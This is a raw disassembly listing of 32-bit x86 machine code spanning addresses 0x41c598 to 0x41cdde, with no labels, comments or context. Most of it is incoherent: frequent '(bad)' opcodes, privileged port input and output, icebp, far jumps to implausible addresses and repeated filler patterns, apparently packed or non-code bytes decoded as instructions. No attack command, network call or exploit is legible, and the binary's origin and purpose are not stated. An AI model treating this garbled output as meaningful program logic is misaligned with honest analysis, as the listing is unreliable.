  41c598:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c599:	jge    0x41c54e
  41c59b:	mov    WORD PTR ds:[edi-0x6267aef5],?
  41c5a2:	fsubr  QWORD PTR [ebp+eax*8-0x6f]
  41c5a6:	mov    al,0x3e
  41c5a8:	mov    WORD PTR [edi-0x427faef5],?
  41c5ae:	fnsave [ebx+0x7e]
  41c5b1:	in     al,dx
  41c5b2:	or     dl,ch
  41c5b4:	mov    esi,ds
  41c5b6:	mov    esp,0xb8d84f71
  41c5bb:	dec    ebp
  41c5bc:	push   ebp
  41c5bd:	in     al,dx
  41c5be:	or     BYTE PTR [esi],cl
  41c5c0:	(bad)  
  41c5c1:	(bad)  
  41c5c2:	mov    esp,0xbad73f71
  41c5c7:	inc    esi
  41c5c8:	cmp    ebp,DWORD PTR [ebx-0xcb8ef8]
  41c5ce:	mov    cl,0x5e
  41c5d0:	cmp    al,0x4
  41c5d2:	out    0x63,eax
  41c5d4:	sub    BYTE PTR [edi],cl
  41c5d6:	or     DWORD PTR [esi],esi
  41c5d8:	mov    WORD PTR [edi+eiz*4],ss
  41c5db:	bound  esp,QWORD PTR [eax]
  41c5dd:	repnz stos DWORD PTR es:[edi],eax
  41c5df:	arpl   WORD PTR [eax],bp
  41c5e1:	sbb    eax,0xa8c2a09
  41c5e6:	mov    al,ds:0x73
	...
  41c5fb:	add    BYTE PTR [edx+ebx*1],ah
  41c5fe:	mov    esi,0xaa34ee73
  41c603:	pop    esi
  41c604:	icebp  
  41c605:	push   eax
  41c606:	or     al,0x47
  41c608:	mov    WORD PTR [esi],?
  41c60a:	test   eax,0xb050e760
  41c60f:	jmp    FWORD PTR [ebx-0x76]
  41c612:	or     al,0x61
  41c614:	repz dec ecx
  41c616:	stos   BYTE PTR es:[edi],al
  41c617:	(bad)  
  41c618:	out    dx,eax
  41c619:	push   edi
  41c61a:	or     al,0x26
  41c61c:	mov    WORD PTR [esi-0x58],cs
  41c61f:	ins    BYTE PTR es:[edi],dx
  41c620:	mov    edi,0xb0b70494
  41c625:	xor    eax,0x94bfa91a
  41c62a:	and    eax,DWORD PTR [edi*4+0x2ba7f52f]
  41c631:	cdq    
  41c632:	and    DWORD PTR [ebx*4-0x5356fcd1],eax
  41c639:	and    bh,bl
  41c63b:	add    edx,DWORD PTR [edx-0x6c]
  41c63e:	icebp  
  41c63f:	test   al,0x6c
  41c641:	and    bl,bh
  41c643:	add    ecx,DWORD PTR [ecx-0x6c]
  41c646:	shr    BYTE PTR [eax-0x5931da81],cl
  41c64c:	fs sub edi,ecx
  41c64f:	mov    bh,0xeb
  41c651:	cwde   
  41c652:	inc    DWORD PTR [ebx]
  41c654:	cmp    DWORD PTR [ebp-0x60],eax
  41c657:	(bad)  
  41c658:	pop    edi
  41c659:	xor    esi,DWORD PTR [ecx-0x20dba149]
  41c65f:	add    eax,DWORD PTR [eax]
	...
  41c671:	add    BYTE PTR [eax],al
  41c673:	add    BYTE PTR [ecx+0x25],al
  41c676:	sahf   
  41c677:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c678:	xor    al,0x65
  41c67a:	shl    ecx,1
  41c67c:	das    
  41c67d:	sub    BYTE PTR [ebx-0x6c6bb8fd],cl
  41c683:	mov    ds:0xb694304a,al
  41c688:	cs es (bad) 
  41c68b:	mov    ch,0x28
  41c68d:	xor    cl,BYTE PTR [eax-0x20acd161]
  41c693:	add    ebp,ebx
  41c695:	xchg   esp,eax
  41c696:	xor    al,0xa2
  41c698:	mul    DWORD PTR [edi]
  41c69a:	inc    eax
  41c69b:	test   al,0xde
  41c69d:	and    eax,DWORD PTR [esi+esi*4-0x3d]
  41c6a1:	and    dh,BYTE PTR [esi]
  41c6a3:	stos   BYTE PTR es:[edi],al
  41c6a4:	repnz sub BYTE PTR [esp+eax*1-0x21],al
  41c6a9:	and    ecx,DWORD PTR [esi+esi*4-0x12]
  41c6ad:	or     BYTE PTR es:[edi],bh
  41c6b0:	outs   dx,BYTE PTR ds:[esi]
  41c6b1:	xor    al,0x64
  41c6b3:	cmp    eax,0xe9089490
  41c6b8:	(bad)  
  41c6b9:	xchg   esp,eax
  41c6ba:	or     cl,ch
  41c6bc:	(bad)  
  41c6bd:	xchg   esp,eax
  41c6be:	or     cl,ch
  41c6c0:	(bad)  
  41c6c1:	xchg   esp,eax
  41c6c2:	or     cl,ch
  41c6c4:	(bad)  
  41c6c5:	xchg   esp,eax
  41c6c6:	or     cl,ch
  41c6c8:	(bad)  
  41c6c9:	xchg   esp,eax
  41c6ca:	or     cl,ch
  41c6cc:	(bad)  
  41c6cd:	xchg   esp,eax
  41c6ce:	or     cl,ch
  41c6d0:	(bad)  
  41c6d1:	xchg   esp,eax
  41c6d2:	or     cl,ch
  41c6d4:	(bad)  
  41c6d5:	xchg   esp,eax
  41c6d6:	or     cl,ch
	...
  41c6ec:	(bad)  
  41c6ed:	xchg   esp,eax
  41c6ee:	or     cl,ch
  41c6f0:	(bad)  
  41c6f1:	xchg   esp,eax
  41c6f2:	or     cl,ch
  41c6f4:	(bad)  
  41c6f5:	xchg   esp,eax
  41c6f6:	or     cl,ch
  41c6f8:	(bad)  
  41c6f9:	xchg   esp,eax
  41c6fa:	or     cl,ch
  41c6fc:	(bad)  
  41c6fd:	xchg   esp,eax
  41c6fe:	or     cl,ch
  41c700:	(bad)  
  41c701:	xchg   esp,eax
  41c702:	or     cl,ch
  41c704:	(bad)  
  41c705:	xchg   esp,eax
  41c706:	or     cl,ch
  41c708:	(bad)  
  41c709:	xchg   esp,eax
  41c70a:	or     cl,ch
  41c70c:	(bad)  
  41c70d:	xchg   esp,eax
  41c70e:	or     cl,ch
  41c710:	(bad)  
  41c711:	xchg   esp,eax
  41c712:	or     cl,ch
  41c714:	(bad)  
  41c715:	xchg   esp,eax
  41c716:	or     cl,ch
  41c718:	(bad)  
  41c719:	xchg   esp,eax
  41c71a:	or     cl,ch
  41c71c:	(bad)  
  41c71d:	xchg   esp,eax
  41c71e:	or     cl,ch
  41c720:	(bad)  
  41c721:	xchg   esp,eax
  41c722:	or     cl,ch
  41c724:	(bad)  
  41c725:	xchg   esp,eax
  41c726:	or     cl,ch
  41c728:	(bad)  
  41c729:	xchg   esp,eax
  41c72a:	or     cl,ch
  41c72c:	(bad)  
  41c72d:	xchg   esp,eax
  41c72e:	or     cl,ch
  41c730:	(bad)  
  41c731:	xchg   esp,eax
  41c732:	or     cl,ch
  41c734:	(bad)  
  41c735:	xchg   esp,eax
  41c736:	or     cl,ch
  41c738:	(bad)  
  41c739:	xchg   esp,eax
  41c73a:	or     BYTE PTR [eax],al
  41c73c:	jne    0x41c6d1
  41c73e:	or     BYTE PTR [eax],al
  41c740:	gs xchg ebx,eax
  41c742:	or     BYTE PTR [eax],al
  41c744:	gs xchg ebx,eax
  41c746:	or     BYTE PTR [eax],al
  41c748:	xor    eax,0x35000893
  41c74d:	xchg   ebx,eax
  41c74e:	or     BYTE PTR [eax],al
	...
  41c764:	and    eax,0x25000893
  41c769:	xchg   ebx,eax
  41c76a:	or     BYTE PTR [eax],al
  41c76c:	xor    eax,0x35000893
  41c771:	xchg   ebx,eax
  41c772:	or     BYTE PTR [eax],al
  41c774:	and    eax,0x25000893
  41c779:	xchg   ebx,eax
  41c77a:	or     BYTE PTR [eax],al
  41c77c:	cmc    
  41c77d:	xchg   edx,eax
  41c77e:	or     BYTE PTR [eax],al
  41c780:	cmc    
  41c781:	xchg   edx,eax
  41c782:	or     BYTE PTR [eax],al
  41c784:	in     eax,0x92
  41c786:	or     BYTE PTR [eax],al
  41c788:	in     eax,0x92
  41c78a:	or     BYTE PTR [eax],al
  41c78c:	cmc    
  41c78d:	xchg   edx,eax
  41c78e:	or     BYTE PTR [eax],al
  41c790:	cmc    
  41c791:	xchg   edx,eax
  41c792:	or     BYTE PTR [eax],al
  41c794:	in     eax,0x92
  41c796:	or     BYTE PTR [eax],al
  41c798:	in     eax,0x92
  41c79a:	or     BYTE PTR [eax],al
  41c79c:	mov    ch,0x92
  41c79e:	or     BYTE PTR [eax],al
  41c7a0:	mov    ch,0x92
  41c7a2:	or     BYTE PTR [eax],al
  41c7a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7a5:	xchg   edx,eax
  41c7a6:	or     BYTE PTR [eax],al
  41c7a8:	pop    ecx
  41c7a9:	or     esp,esp
  41c7ab:	push   ecx
  41c7ac:	pop    ss
  41c7ad:	push   ecx
  41c7ae:	add    BYTE PTR [edx-0xbcf36c],cl
  41c7b4:	pop    es
  41c7b5:	mov    cl,0x52
  41c7b7:	ret    
  41c7b8:	cmp    DWORD PTR [ebx],ecx
  41c7ba:	in     al,0x51
  41c7bc:	loop   0x41c7fb
  41c7be:	cmp    ecx,ecx
  41c7c0:	call   0x7723ece
  41c7c5:	pop    ds
  41c7c6:	add    al,0x8b
	...
  41c7dc:	cli    
  41c7dd:	js     0x41c760
  41c7df:	inc    esi
  41c7e0:	xchg   esp,eax
  41c7e1:	or     ecx,DWORD PTR [ebx-0x4]
  41c7e4:	pop    ss
  41c7e5:	pop    ss
  41c7e6:	sub    BYTE PTR [ebx+0x6b3514a2],cl
  41c7ec:	fmul   DWORD PTR [ebp+0x20d73f88]
  41c7f2:	or     ch,bl
  41c7f4:	xor    eax,0x318b5636
  41c7f9:	cmp    cl,cl
  41c7fb:	int3   
  41c7fc:	(bad)  [ecx]
  41c7fe:	in     al,0x83
  41c800:	cmp    BYTE PTR [ecx-0x7f],dh
  41c803:	inc    ebp
  41c804:	xchg   esp,eax
  41c805:	or     ecx,DWORD PTR [ebx-0x20]
  41c808:	pop    es
  41c809:	dec    eax
  41c80a:	call   0x8f6819a
  41c80f:	push   ecx
  41c810:	enter  0x5b0b,0xe4
  41c814:	pop    ss
  41c815:	push   eax
  41c816:	in     al,dx
  41c817:	mov    eax,DWORD PTR [esp+ebx*1+0x9]
  41c81b:	dec    ebp
  41c81c:	test   BYTE PTR [ebx],cl
  41c81e:	inc    ebx
  41c81f:	clc    
  41c820:	pop    ss
  41c821:	inc    eax
  41c822:	lock mov ecx,DWORD PTR [esi+0x70]
  41c826:	or     DWORD PTR [ebp-0x7c],eax
  41c829:	or     ecx,DWORD PTR [ebx-0x18]
  41c82c:	pop    es
  41c82d:	dec    eax
  41c82e:	lock mov ebx,DWORD PTR [ebp+0x74]
  41c832:	or     DWORD PTR [ebp-0x6c],edx
  41c835:	or     ebx,DWORD PTR [ebx-0x10]
  41c838:	pop    es
  41c839:	push   eax
  41c83a:	lock mov eax,DWORD PTR [eax+edi*2+0x9]
  41c83f:	dec    ebp
	...
  41c854:	xchg   esp,eax
  41c855:	or     eax,DWORD PTR [ebx-0x4]
  41c858:	retf   
  41c859:	dec    edi
  41c85a:	cld    
  41c85b:	add    BYTE PTR [esp+edx*4+0x985eb08],cl
  41c862:	pop    ebx
  41c863:	hlt    
  41c864:	psrld  mm0,QWORD PTR [esi]
  41c867:	mov    ecx,ebx
  41c869:	mov    al,ds:0x9744580
  41c86e:	inc    ebx
  41c86f:	hlt    
  41c870:	mov    bh,0x4c
  41c872:	adc    BYTE PTR [ebx-0x2c],dh
  41c875:	or     DWORD PTR [ebx-0x10],ebx
  41c878:	pop    ss
  41c879:	xchg   edx,eax
  41c87a:	or     DWORD PTR [ebp-0x7c],eax
  41c87d:	or     ecx,DWORD PTR [ebx-0x24]
  41c880:	out    0x86,al
  41c882:	pusha  
  41c883:	lods   al,BYTE PTR ds:[esi]
  41c884:	mov    ss,WORD PTR [eax+ecx*1-0x75]
  41c888:	sar    DWORD PTR [eax-0x6c2317aa],1
  41c88e:	or     BYTE PTR [eax],al
  41c890:	(bad)  
  41c892:	add    eax,DWORD PTR [ebp-0x74eee0b4]
  41c898:	mov    ecx,0x244580a0
  41c89d:	test   DWORD PTR [ebp+0x430bbc0c],edi
  41c8a3:	in     al,dx
  41c8a4:	pop    ss
  41c8a5:	aas    
  41c8a6:	in     al,0x8b
  41c8a8:	dec    ecx
  41c8a9:	cwde   
  41c8aa:	add    BYTE PTR [esp+ebx*1],0x91
  41c8ae:	dec    ebx
  41c8af:	or     bh,ah
  41c8b1:	xchg   BYTE PTR [ecx-0x38ef23b3],al
  41c8b7:	add    al,0x0
	...
  41c8c9:	add    BYTE PTR [eax],al
  41c8cb:	add    BYTE PTR ds:0x30ebf847,dl
  41c8d1:	popa   
  41c8d2:	enter  0xe98b,0x36
  41c8d6:	leave  
  41c8d7:	int3   
  41c8d8:	fadd   st,st(7)
  41c8da:	ret    
  41c8db:	int3   
  41c8dc:	rol    bh,1
  41c8de:	ret    
  41c8df:	int3   
  41c8e0:	enter  0xc3c7,0xcc
  41c8e4:	pop    ecx
  41c8e5:	or     esp,esp
  41c8e7:	cmp    DWORD PTR [eax-0x5cfa1f85],0xffffff94
  41c8ee:	hlt    
  41c8ef:	mov    DWORD PTR [ecx-0x54],edx
  41c8f2:	add    BYTE PTR [ebp-0x5c],0x43
  41c8f6:	loopne 0x41c921
  41c8f8:	mov    edx,DWORD PTR [esp+esi*8-0x5866b77d]
  41c8ff:	hlt    
  41c900:	add    dl,dh
  41c902:	or     BYTE PTR [eax+0x30],ch
  41c905:	xchg   edi,eax
  41c906:	dec    eax
  41c907:	add    BYTE PTR [edi],dl
  41c909:	loop   0x41c8eb
  41c90b:	push   ecx
  41c90c:	arpl   WORD PTR [edx-0x6b328904],bp
  41c912:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c913:	clc    
  41c914:	fcmovbe st,st(5)
  41c916:	or     BYTE PTR [edx-0x74],ch
  41c919:	dec    BYTE PTR [eax]
  41c91b:	push   0x489750
  41c920:	cmp    ebp,DWORD PTR [edx-0x6b328910]
  41c926:	add    DWORD PTR [ebp+0x34],0x8cfc4e5c
  41c92d:	xchg   esp,eax
  41c92e:	or     BYTE PTR [eax],al
	...
  41c944:	daa    
  41c945:	sahf   
  41c946:	jg     0x41c99d
  41c948:	adc    BYTE PTR [eax],bl
  41c94a:	mov    DWORD PTR [ecx],0x83f4ea15
  41c950:	adc    DWORD PTR [eax+0x1fad7301],0xa107fc4e
  41c95a:	lea    ecx,[esi+ecx*4+0x175108d4]
  41c961:	jmp    0x76fc:0xa9db52e0
  41c968:	dec    ebp
  41c969:	xchg   esp,eax
  41c96a:	jg     0x41c9b9
  41c96c:	enter  0xd1d,0x8d
  41c970:	mov    eax,0xa7004a0a
  41c975:	fs and ch,0x51
  41c979:	push   edi
  41c97a:	(bad)
  41c97d:	pusha  
  41c97e:	(bad)
  41c981:	pusha  
  41c982:	(bad)
  41c985:	pusha  
  41c986:	(bad)
  41c989:	pop    ds
  41c98a:	in     eax,0xa1
  41c98c:	fmul   DWORD PTR [ebx]
  41c98e:	dec    edx
  41c98f:	add    dl,al
  41c991:	pop    ds
  41c992:	dec    ecx
  41c993:	xor    BYTE PTR [edi],al
  41c995:	loope  0x41c997
  41c997:	ds add eax,0x4f5d00dc
  41c99d:	pusha  
  41c99e:	(bad)
  41c9a1:	pusha  
  41c9a2:	(bad)
  41c9a5:	pusha  
  41c9a6:	(bad)
	...
  41c9b9:	add    BYTE PTR [eax],al
  41c9bb:	add    BYTE PTR [ecx-0x2e741ae1],bh
  41c9c1:	mov    al,ds:0x9cd18b58
  41c9c6:	pop    ecx
  41c9c7:	jmp    DWORD PTR [ecx-0x73be8478]
  41c9cd:	icebp  
  41c9ce:	(bad)  
  41c9cf:	int3   
  41c9d0:	pop    eax
  41c9d1:	pusha  
  41c9d2:	(bad)
  41c9d5:	pusha  
  41c9d6:	(bad)
  41c9d9:	pusha  
  41c9da:	(bad)
  41c9dd:	pop    ds
  41c9de:	in     eax,0x83
  41c9e0:	clc    
  41c9e1:	fwait
  41c9e2:	pop    esi
  41c9e3:	add    BYTE PTR [esi-0x6c],dh
  41c9e6:	pusha  
  41c9e7:	fmul   QWORD PTR [esi-0x6600f72c]
  41c9ed:	mov    WORD PTR [ebx+0x41],?
  41c9f0:	mov    WORD PTR ds:0x7c74f84e,ds
  41c9f6:	pop    es
  41c9f7:	inc    eax
  41c9f8:	mov    WORD PTR [edi],ds
  41c9fa:	dec    esi
  41c9fb:	clc    
  41c9fc:	cmp    al,0x7c
  41c9fe:	scas   eax,DWORD PTR es:[edi]
  41c9ff:	dec    ebx
  41ca01:	xchg   edx,eax
  41ca02:	mov    ah,al
  41ca04:	xchg   esp,eax
  41ca05:	sbb    eax,0xe107fc4e
  41ca0a:	sbb    BYTE PTR [ecx+0x7],dl
  41ca0d:	jmp    0xd9591c16
  41ca12:	add    BYTE PTR [eax-0x5d],dl
  41ca15:	call   0xf0f3560e
  41ca1a:	(bad)  
  41ca1b:	int3   
  41ca1c:	cmp    DWORD PTR [edi],ebx
  41ca1e:	in     eax,0x51
	...
  41ca34:	push   ebx
  41ca35:	fdiv   st,st(4)
  41ca37:	add    BYTE PTR [esp+edx*4+0x1d85eb08],cl
  41ca3e:	dec    esi
  41ca3f:	cld    
  41ca40:	andnps xmm1,XMMWORD PTR [edx]
  41ca43:	mov    ecx,edx
  41ca45:	nop
  41ca46:	or     BYTE PTR [ebp+0x60],0xce
  41ca4a:	inc    ebp
  41ca4b:	adc    bh,bl
  41ca4d:	mov    cl,0x7f
  41ca4f:	push   ebp
  41ca50:	test   BYTE PTR [ebp+0x4a9bfc5d],dl
  41ca56:	pop    es
  41ca57:	mov    edx,ecx
  41ca59:	mov    al,ds:0xa2384d07
  41ca5e:	mov    edx,0x7d567711
  41ca63:	pop    es
  41ca64:	in     al,0x93
  41ca66:	or     BYTE PTR [eax],al
  41ca68:	mov    WORD PTR [ebp+0xd],?
  41ca6b:	jmp    0x41caa9
  41ca6d:	(bad)  
  41ca6e:	enter  0x298b,0xf0
  41ca72:	(bad)  
  41ca73:	int3   
  41ca74:	fsub   DWORD PTR [eax-0x3b]
  41ca77:	int3   
  41ca78:	shl    BYTE PTR [eax-0x3b],1
  41ca7b:	int3   
  41ca7c:	enter  0xc560,0xcc
  41ca80:	pop    ecx
  41ca81:	sbb    eax,0x9484b9e5
  41ca86:	or     BYTE PTR [eax],al
  41ca88:	push   0x8989021d
  41ca8d:	loopne 0x41cb0a
  41ca8f:	inc    ecx
  41ca90:	mov    edi,gs
  41ca92:	(bad)  
  41ca93:	int3   
  41ca94:	fsub   DWORD PTR [eax-0x3b]
  41ca97:	int3   
	...
  41caac:	shl    BYTE PTR [eax-0x3b],1
  41caaf:	int3   
  41cab0:	enter  0xc560,0xcc
  41cab4:	pop    ecx
  41cab5:	sbb    eax,0xa4b883e5
  41caba:	jg     0x41cb01
  41cabc:	xchg   esp,eax
  41cabd:	adc    eax,0xa18c0471
  41cac2:	mov    WORD PTR [eax-0x74f76b74],cs
  41cac8:	fstp   DWORD PTR [edi+edi*2-0x20ea77af]
  41cacf:	or     BYTE PTR [ebp+0x7e],bl
  41cad2:	adc    BYTE PTR [ebp+0x78],0x1d
  41cad6:	dec    esi
  41cad7:	or     BYTE PTR [edi],cl
  41cad9:	push   esp
  41cada:	add    DWORD PTR [ecx+0x45cc84c9],ecx
  41cae0:	pop    eax
  41cae1:	xchg   esp,eax
  41cae2:	or     BYTE PTR [eax],al
  41cae4:	mov    WORD PTR [ebp+0x2],?
  41cae7:	mov    ebx,ecx
  41cae9:	nop
  41caea:	mov    cl,al
  41caec:	lea    ebx,[ebx]
  41caee:	inc    esi
  41caef:	cld    
  41caf0:	pop    es
  41caf1:	out    0xf4,eax
  41caf3:	cmp    ebx,ecx
  41caf5:	mov    BYTE PTR [eax+0x46],bh
  41caf8:	pop    ss
  41caf9:	xlat   BYTE PTR ds:[ebx]
  41cafa:	hlt    
  41cafb:	mov    edx,ecx
  41cafd:	test   BYTE PTR [edi+esi*4],al
  41cb00:	adc    bl,0xc9
  41cb03:	cli    
  41cb04:	adc    BYTE PTR ds:0xc68103ef,0x7f
  41cb0b:	inc    ebp
  41cb0c:	add    BYTE PTR ds:0xf046,bl
	...
  41cb22:	add    BYTE PTR [eax],al
  41cb24:	mov    ecx,DWORD PTR [ecx+0x1d]
  41cb27:	inc    ecx
  41cb28:	or     eax,0x8c0ff476
  41cb2d:	xchg   esp,eax
  41cb2e:	adc    DWORD PTR [ebp-0x1c],0x7084e1c
  41cb35:	fild   WORD PTR [ebx+eax*1]
  41cb38:	test   BYTE PTR ds:0x9817f85e,bl
  41cb3e:	sbb    DWORD PTR [ebx],eax
  41cb40:	dec    ecx
  41cb41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb42:	jg     0x41cb91
  41cb44:	test   BYTE PTR ds:0xa38f0c5e,bl
  41cb4a:	jg     0x41cb99
  41cb4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb4d:	sbb    cl,BYTE PTR ds:0x803ab70a
  41cb53:	push   ebp
  41cb54:	test   BYTE PTR ds:0xd68f084e,bl
  41cb5a:	or     al,0x89
  41cb5c:	rcr    DWORD PTR [ecx+eiz*8-0xb6f7c95],1
  41cb63:	mov    esi,DWORD PTR [ecx-0xe]
  41cb66:	(bad)  
  41cb67:	int3   
  41cb68:	fstp   DWORD PTR [ebx]
  41cb6a:	in     eax,0x83
  41cb6c:	js     0x41cb27
  41cb6e:	jg     0x41cbb5
  41cb70:	xchg   esp,eax
  41cb71:	sbb    eax,0xe207e44e
  41cb76:	in     al,dx
  41cb77:	mov    edi,DWORD PTR [ecx-0x77aef788]
  41cb7d:	sbb    eax,0xda17e85e
  41cb82:	loopne 0x41cb0f
  41cb84:	add    al,0x15
  41cb86:	or     DWORD PTR [eax],eax
	...
  41cb9c:	mov    WORD PTR ds:0x120ff046,ds
  41cba2:	stc    
  41cba3:	add    BYTE PTR [ebx-0x73ff0fe8],dl
  41cba9:	xchg   esp,eax
  41cbaa:	jg     0x41cc01
  41cbac:	test   BYTE PTR [ebx-0x15ea0fa3],dl
  41cbb2:	call   0x88b61542
  41cbb7:	js     0x41cb55
  41cbb9:	xchg   esp,eax
  41cbba:	add    eax,DWORD PTR [ecx+ebp*8+0x76000894]
  41cbc1:	xchg   esp,eax
  41cbc2:	pop    esi
  41cbc3:	add    BYTE PTR [edi],dl
  41cbc5:	loop   0x41cbaf
  41cbc7:	mov    eax,DWORD PTR [ecx-0x64]
  41cbca:	pop    es
  41cbcb:	push   ecx
  41cbcc:	and    dl,0xf3
  41cbcf:	adc    eax,0x4a06c4
  41cbd4:	adc    eax,0x518bf4da
  41cbd9:	je     0x41cb63
  41cbdb:	cmp    BYTE PTR [eax+ecx*1+0x74598b12],cl
  41cbe2:	adc    BYTE PTR [ebp-0x6c],0x93
  41cbe6:	sbb    DWORD PTR [ecx+0x45808841],ecx
  41cbec:	lods   al,BYTE PTR ds:[esi]
  41cbed:	sbb    eax,DWORD PTR [esi+0x8]
  41cbf0:	(bad)  
  41cbf1:	fcomp  QWORD PTR [eax]
  41cbf3:	mov    ecx,edx
  41cbf5:	and    al,0x17
  41cbf8:	pop    es
  41cbf9:	jmp    0x9d0b57e6
  41cbfe:	pop    es
  41cbff:	inc    edx
	...
  41cc14:	jl     0x41cc33
  41cc16:	dec    esi
  41cc17:	hlt    
  41cc18:	pop    ss
  41cc19:	loope  0x41cc03
  41cc1b:	mov    eax,ecx
  41cc1d:	pushf  
  41cc1e:	pop    es
  41cc1f:	adc    DWORD PTR ds:0xd1c7e4e9,eax
  41cc25:	mov    WORD PTR [ecx],cs
  41cc27:	add    BYTE PTR [esp+edx*4+0x132c457f],cl
  41cc2e:	jno    0x41cc40
  41cc30:	mov    WORD PTR [eax],cs
  41cc32:	add    al,0x8b
  41cc34:	fnstenv [eax+ecx*4+0x39]
  41cc38:	mov    WORD PTR [eax],cs
  41cc3a:	or     al,0xc7
  41cc3c:	ror    DWORD PTR [edx+ecx*1+0x7f948c00],1
  41cc43:	push   ebp
  41cc44:	add    BYTE PTR [ebx],dl
  41cc46:	das    
  41cc47:	add    BYTE PTR [eax-0xb],bh
  41cc4a:	jg     0x41cc91
  41cc4c:	add    BYTE PTR [ebx],bl
  41cc4e:	add    DWORD PTR [ecx+0x893ed],eax
  41cc54:	or     al,0x8
  41cc56:	adc    eax,0x8088398b
  41cc5b:	add    dh,BYTE PTR [ecx+0x53fff48f]
  41cc61:	in     al,0x7f
  41cc63:	dec    ebp
  41cc64:	enter  0xe0e4,0xb5
  41cc68:	ror    DWORD PTR [esi-0x642f7c0c],0x81
  41cc6f:	inc    ebp
  41cc70:	sar    BYTE PTR [edx+0x15],1
  41cc73:	mov    eax,DWORD PTR [ecx-0x78]
  41cc76:	add    BYTE PTR [edx],0x0
	...
  41cc89:	add    BYTE PTR [eax],al
  41cc8b:	add    BYTE PTR [edi],dl
  41cc8d:	loope  0x41cc8f
  41cc8f:	lea    eax,[eax-0x64]
  41cc92:	push   es
  41cc93:	push   edx
  41cc94:	pop    es
  41cc95:	fxtract 
  41cc97:	push   eax
  41cc98:	je     0x41ccc0
  41cc9a:	idiv   bh
  41cc9c:	adc    DWORD PTR [edx],0xffffffcd
  41cc9f:	or     BYTE PTR ds:0xc18bd4d8,al
  41cca5:	add    BYTE PTR [eax+0x1a1c4855],0x8b
  41ccac:	leave  
  41ccad:	mov    BYTE PTR [eax+0x4e1b90c0],cl
  41ccb3:	hlt    
  41ccb4:	pop    es
  41ccb5:	loopne 0x41cc9b
  41ccb7:	or     DWORD PTR [ebp-0x67],0xffffff81
  41ccbb:	dec    ebp
  41ccbc:	xor    BYTE PTR [edx-0x64],bh
  41ccbf:	mov    esp,ecx
  41ccc1:	je     0x41cc4b
  41ccc3:	ret    0x1b98
  41ccc6:	pop    esi
  41ccc7:	loopne 0x41ccfe
  41ccc9:	lahf   
  41ccca:	repz jmp DWORD PTR [ebx]
  41cccd:	sbb    ch,dh
  41cccf:	pop    ebp
  41ccd0:	dec    edi
  41ccd1:	popa   
  41ccd2:	(bad)
  41ccd5:	sbb    ebp,esp
  41ccd7:	cmp    eax,0xffffff9c
  41ccda:	pusha  
  41ccdb:	lock mov ss,esp
  41ccde:	or     bh,bh
  41cce0:	mov    eax,ds:0x8c417b94
  41cce5:	sbb    ecx,DWORD PTR [esi-0x8]
  41cce8:	je     0x41cc7a
  41ccea:	pop    es
  41cceb:	inc    eax
  41ccec:	mov    WORD PTR [ecx],ds
  41ccee:	dec    esi
  41ccef:	clc    
	...
  41cd04:	cmp    al,0x7c
  41cd06:	xor    edi,ebp
  41cd08:	ror    DWORD PTR [ebp+0x1b94c488],cl
  41cd0e:	dec    esi
  41cd0f:	cld    
  41cd10:	pop    ss
  41cd11:	loopne 0x41cd2b
  41cd13:	push   ecx
  41cd14:	pop    es
  41cd15:	call   0xd8491f1e
  41cd1a:	add    BYTE PTR [eax-0x55],dl
  41cd1d:	out    0xf4,eax
  41cd1f:	mov    ebp,DWORD PTR [ecx-0x37333811]
  41cd25:	pusha  
  41cd26:	(bad)
  41cd29:	sbb    ebp,esp
  41cd2b:	mov    eax,ds:0x4a05e4
  41cd30:	dec    edx
  41cd31:	xchg   esp,eax
  41cd32:	pusha  
  41cd33:	mov    esp,DWORD PTR [ecx-0x73be841c]
  41cd39:	sbb    ebx,DWORD PTR [ecx+0x1]
  41cd3c:	push   ds
  41cd3d:	push   ecx
  41cd3e:	adc    DWORD PTR [eax-0x77],0x48ccc7ef
  41cd45:	pusha  
  41cd46:	(bad)
  41cd49:	sbb    ebp,esp
  41cd4b:	cmp    DWORD PTR [eax],0xffffffa0
  41cd4e:	test   eax,0x8d3bb4c
  41cd53:	mov    ebx,DWORD PTR [esi-0x3f]
  41cd56:	sar    DWORD PTR [esi],0x7
  41cd59:	aam    0x38
  41cd5b:	mov    edi,DWORD PTR [esi]
  41cd5d:	sbb    edi,edx
  41cd5f:	ds pop ss
  41cd61:	fadd   QWORD PTR [ebx+ecx*4]
  41cd64:	sbb    eax,DWORD PTR ds:[esi-0xc]
	...
  41cd7c:	pop    es
  41cd7d:	xlat   BYTE PTR ds:[ebx]
  41cd7e:	cld    
  41cd7f:	mov    edx,DWORD PTR [eax+eiz*4-0x7f]
  41cd83:	dec    ebp
  41cd84:	add    al,0x19
  41cd86:	pop    esi
  41cd87:	clc    
  41cd88:	add    eax,0x8db8f4e7
  41cd8d:	xchg   esp,eax
  41cd8e:	or     BYTE PTR [eax],al
  41cd90:	adc    DWORD PTR [ebp+edi*2+0x44],edx
  41cd94:	(bad)  
  41cd95:	psllw  mm0,QWORD PTR [eax]
  41cd98:	popa   
  41cd99:	cwde   
  41cd9a:	aaa    
  41cd9b:	shl    bh,0xcf
  41cd9e:	jg     0x41cded
  41cda0:	les    ebx,FWORD PTR [eax]
  41cda2:	pop    edx
  41cda3:	sbb    BYTE PTR [edi-0x6a8aff19],al
  41cda9:	sbb    DWORD PTR [esi-0x8],ecx
  41cdac:	pop    es
  41cdad:	fild   WORD PTR [ecx+ecx*4]
  41cdb0:	push   esp
  41cdb1:	mov    al,0x7f
  41cdb3:	push   ebp
  41cdb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdb5:	sbb    BYTE PTR [esi+0x10],cl
  41cdb8:	add    eax,0x8db810d2
  41cdbd:	xchg   esp,eax
  41cdbe:	or     BYTE PTR [eax],al
  41cdc0:	ja     0x41cd6f
  41cdc2:	jg     0x41ce11
  41cdc4:	test   BYTE PTR [eax],ah
  41cdc6:	sbb    cl,BYTE PTR [ecx+0x45808ce1]
  41cdcc:	je     0x41cd9e
  41cdce:	dec    ebp
  41cdcf:	cld    
  41cdd0:	loope  0x41cd62
  41cdd2:	aaa    
  41cdd3:	shl    BYTE PTR [edi-0x6f],0xdf
  41cdd7:	mov    bl,0x9f
  41cdd9:	push   esp
  41cdda:	and    ch,0xb1
  41cddd:	push   edi
  41cdde:	(bad)
	...
